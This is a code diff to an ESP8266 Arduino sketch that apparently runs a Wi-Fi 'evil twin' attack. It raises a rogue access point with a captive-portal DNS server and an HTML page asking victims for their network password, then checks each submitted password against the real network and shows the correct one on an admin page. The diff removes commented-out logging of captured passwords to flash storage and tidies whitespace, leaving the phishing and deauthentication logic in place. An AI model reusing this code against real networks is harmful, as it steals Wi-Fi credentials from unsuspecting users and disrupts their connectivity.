@@ -38,24 +38,11 @@ String _tryPassword = "";
 void setup() {
 
   Serial.begin(115200);
-  /*
-    bool res = SPIFFS.begin();
-    File f = SPIFFS.open("/log.txt", "r");
-
-    if (!f) {
-      File f = SPIFFS.open("/f.txt", "w");
-      f.println("Koala");
-      f.println("neznambebi");
-    }
-    f.close();
-  */
   WiFi.mode(WIFI_AP_STA);
   wifi_promiscuous_enable(1);
   WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
   WiFi.softAP("M1z23R", "deauther");
   dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
-
-  // replay to all requests with same HTML
 
   webServer.on("/", handleIndex);
   webServer.on("/result", handleResult);
@@ -86,7 +73,7 @@ bool deauthing_active = false;
 void handleResult() {
   String html = "";
   if (WiFi.status() != WL_CONNECTED) {
-    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Wrong Password</h2><p>Please, try again.</p></body> </html>"); // ADD SCRIPT RELOAD LOGIN
+    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Wrong Password</h2><p>Please, try again.</p></body> </html>");
     Serial.println("Wrong password tried !");
   } else {
     webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Good password</h2></body> </html>");
@@ -198,9 +185,6 @@ void handleIndex() {
     if (_correct != "") {
       _html += "</br><h3>" + _correct + "</h3>";
     }
-    /*
-       Implement read from SPIFFS for all logs
-    */
 
     _html += "</div></body></html>";
     webServer.send(200, "text/html", _html);
@@ -208,13 +192,6 @@ void handleIndex() {
   } else {
 
     if (webServer.hasArg("password")) {
-      /*
-        File f = SPIFFS.open("/log.txt", FILE_APPEND);
-        if (f) {
-        f.println(_selectedNetwork.ssid);
-        f.println(webServer.arg("password"));
-        }
-      */
       _tryPassword = webServer.arg("password");
       WiFi.disconnect();
       WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
@@ -304,11 +281,11 @@ void handleAdmin() {
   } else {
     _html.replace("{disabled}", "");
   }
-  
+
   if (_correct != "") {
     _html += "</br><h3>" + _correct + "</h3>";
   }
-  
+
   _html += "</table></div></body></html>";
   webServer.send(200, "text/html", _html);
 
